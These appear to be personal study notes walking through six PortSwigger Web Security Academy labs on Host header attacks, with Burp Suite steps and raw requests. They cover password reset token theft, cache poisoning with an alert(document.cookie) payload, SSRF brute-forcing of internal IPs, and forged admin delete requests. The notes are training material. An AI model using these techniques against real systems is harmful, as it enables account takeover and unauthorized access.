```ad-danger
title: IMPORTANT
TAKE OUT THE TICK FROM THE UPDATE HEADERS OPTION IN INTRUDER MODULE
```
# Table of Contents

- [[#Basic password reset poisoning]]
- [[#Web cache poisoning via ambiguous requests]]
- [[#Host header authentication bypass]]
- [[#Routing-based SSRF]]
- [[#SSRF via flawed request parsing]]
- [[#Host validation bypass via connection state attack]]

# Basic password reset poisoning
Reference: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning

```ad-hint
title: Quick Solution
Just add the exploit server as the ``Host`` parameter. The user ``carlos`` will click on any link he receives and in this way it is possible to steal his token to reset the password.
```

```ad-done
title: Solution
1. Go to the login page and notice the "Forgot your password?" functionality. Request a password reset for your own account.
2. Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. Notice that the URL contains the query parameter ``temp-forgot-password-token``.
3. Click the link and observe that you are prompted to enter a new password. Reset your password to whatever you want.
4. In Burp, study the HTTP history. Notice that the ``POST /forgot-password`` request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter. Send this request to Burp Repeater.
5. In Burp Repeater, observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Go back to the email server and look at the new email that you've received. Notice that the URL in the email contains your arbitrary Host header instead of the usual domain name.
6. Back in Burp Repeater, change the Host header to your exploit server's domain name (``your-exploit-server-id.web-security-academy.net``) and change the ``username`` parameter to ``carlos``. Send the request.
7. Go to your exploit server and open the access log. You will see a request for ``GET /forgot-password`` with the ``temp-forgot-password-token`` parameter containing Carlos's password reset token. Make a note of this token.
8. Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in your browser, but replace your reset token with the one you obtained from the access log.
9. Change Carlos's password to whatever you want, then log in as carlos to solve the lab.
```

# Web cache poisoning via ambiguous requests
Reference: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests

```ad-hint
title: Quick Solution
Just duplicate the ``Host`` header and the second one gets injected in the webpage.
```

```ad-done
title: Solution
1. Send the ``GET /`` request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header. After tampering with it, you are unable to still access the home page.
2. In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, ``GET /?cb=123``. You can simply change this parameter each time you want a fresh response from the back-end server.
3. Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from ``/resources/js/tracking.js``.
4. Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
5. Go to the exploit server and create a file at ``/resources/js/tracking.js`` containing the payload ``alert(document.cookie)``. Store the exploit and copy the domain name for your exploit server.
6. Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:
~~~
GET /?cb=123 HTTP/1.1
Host: your-lab-id.web-security-academy.net
Host: your exploit-server-id.web-security-academy.net
~~~
7. Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in your browser using the same cache buster in the URL. Make sure that the ``alert()`` fires.
8. In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page.
```

# Host header authentication bypass
Reference: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass

```ad-done
title: Solution
1. Send the ``GET /`` request that received a 200 response to Burp Repeater. Notice that you can change the Host header to an arbitrary value and still successfully access the home page.
2. Browse to ``/robots.txt`` and observe that there is an admin panel at ``/admin``.
3. Try and browse to ``/admin``. You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.
4. Send the ``GET /admin`` request to Burp Repeater.
5. In Burp Repeater, change the Host header to ``localhost`` and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.
6. Change the request line to ``GET /admin/delete?username=carlos`` and send the request to delete Carlos and solve the lab.
```

# Routing-based SSRF
Reference: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf

```ad-hint
title: Quick Solution
Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet:
Host: 192.168.0.§0§
Brute-force the IP address and search for a 302 status code. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos. Furthermore, copy the session cookie.
```

```ad-done
title: Solution
1. Send the `GET /` request that received a 200 response to Burp Repeater.
2. In Burp Repeater, select the Host header value, right-click and select **Insert Collaborator payload** to replace it with a Collaborator domain name. Send the request.
3. Go to the Collaborator tab and click **Poll now**. You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server.
4. Send the `GET /` request to Burp Intruder.
5. Go to Burp Intruder and select the **Positions** tab.
6. Deselect **Update Host header to match target**.
7. Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet:
    
    ~~~
    Host: 192.168.0.§0§
    ~~~
1. On the **Payloads** tab, select the payload type **Numbers**. Under **Payload settings**, enter the following values:
    
    ~~~
    From: 0 To: 255 Step: 1
    ~~~
1. Click **Start attack**. A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.
2. When the attack finishes, click the **Status** column to sort the results. Notice that a single request received a 302 response redirecting you to `/admin`. Send this request to Burp Repeater.
3. In Burp Repeater, change the request line to `GET /admin` and send the request. In the response, observe that you have successfully accessed the admin panel.
4. Study the form for deleting users. Notice that it will generate a `POST` request to `/admin/delete` with both a [CSRF](https://portswigger.net/web-security/csrf) token and `username` parameter. You need to manually craft an equivalent request to delete `carlos`.
5. Change the path in your request to `/admin/delete`. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a `username` parameter containing `carlos`. The request line should now look like this but with a different CSRF token:
    
    ~~~
    GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
    ~~~
1. Copy the session cookie from the `Set-Cookie` header in the displayed response and add it to your request.
2. Right-click on your request and select **Change request method**. Burp will convert it to a `POST` request.
3. Send the request to delete `carlos` and solve the lab.
```

# SSRF via flawed request parsing
Reference: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing

```ad-hint
title: Quick Solution
Observe that you can also access the home page by supplying an absolute URL in the request line as follows: GET https://YOUR-LAB-ID.web-security-academy.net/
Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header. Confirm this using Burp Collaborator subdomain as a Host header. After that, you can brute-force the admin panel’s IP and provide the CSRF token plus the session cookie to delete the required account.
```

```ad-success
title: Solution
1. Send the `GET /` request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header and blocks any requests in which it has been modified.
2. Observe that you can also access the home page by supplying an absolute URL in the request line as follows:
    
    ~~~
    GET https://YOUR-LAB-ID.web-security-academy.net/
    ~~~
1. Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.
2. Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server:
    
    ~~~
    GET https://YOUR-LAB-ID.web-security-academy.net/ Host: BURP-COLLABORATOR-SUBDOMAIN
    ~~~
1. Right-click and select **Insert Collaborator payload** to insert a Burp Collaborator subdomain where indicated in the request.
2. Send the request containing the absolute URL to Burp Intruder.
3. Go to Burp Intruder and select the **Positions** tab.
4. Deselect **Update Host header to match target**.
5. Use the Host header to scan the IP range `192.168.0.0/24` to identify the IP address of the admin interface. Send this request to Burp Repeater.
6. In Burp Repeater, append `/admin` to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users.
7. Change the absolute URL in your request to point to `/admin/delete`. Copy the [CSRF](https://portswigger.net/web-security/csrf) token from the displayed response and add it as a query parameter to your request. Also add a `username` parameter containing `carlos`. The request line should now look like this but with a different CSRF token:
    
    ~~~
    GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
    ~~~
1. Copy the session cookie from the `Set-Cookie` header in the displayed response and add it to your request.
2. Right-click on your request and select "Change request method". Burp will convert it to a `POST` request.
3. Send the request to delete `carlos` and solve the lab.
```

# Host validation bypass via connection state attack
Reference: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack

```ad-hint
title: Quick Solution
Make the following adjustments:
- Change the path to /admin.
- Change Host header to 192.168.0.1.
Send the request. Observe that you are simply redirected to the homepage.
Duplicate the tab, then add both tabs to a new group.
Select the first tab and make the following adjustments:
- Change the path back to /.
- Change the Host header back to YOUR-LAB-ID.h1-web-security-academy.net.
Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
Change the Connection header to keep-alive.
Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.
On the second tab in your group, use these details to replicate the request that would be issued when submitting the form. The result should look something like this:
~~~http
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT
csrf=YOUR-CSRF-TOKEN&username=carlos
~~~
```

```ad-success
title: Solution
1. Send the `GET /` request to Burp Repeater.
    
2. Make the following adjustments:
    
    - Change the path to `/admin`.
        
    - Change `Host` header to `192.168.0.1`.
        
3. Send the request. Observe that you are simply redirected to the homepage.
    
4. Duplicate the tab, then add both tabs to a new group.
    
5. Select the first tab and make the following adjustments:
    
    - Change the path back to `/`.
        
    - Change the `Host` header back to `YOUR-LAB-ID.h1-web-security-academy.net`.
        
6. Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**.
    
7. Change the `Connection` header to `keep-alive`.
    
8. Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.
    
9. Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:
    
    - The action attribute (`/admin/delete`)
        
    - The name of the input (`username`)
        
    - The `[csrf](https://portswigger.net/web-security/csrf)` token.
        
10. On the second tab in your group, use these details to replicate the request that would be issued when submitting the form. The result should look something like this:
    
    ~~~
    POST /admin/delete HTTP/1.1 Host: 192.168.0.1 Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE Content-Type: x-www-form-urlencoded Content-Length: CORRECT csrf=YOUR-CSRF-TOKEN&username=carlos
    ~~~
1. Send the requests in sequence down a single connection to solve the lab.
```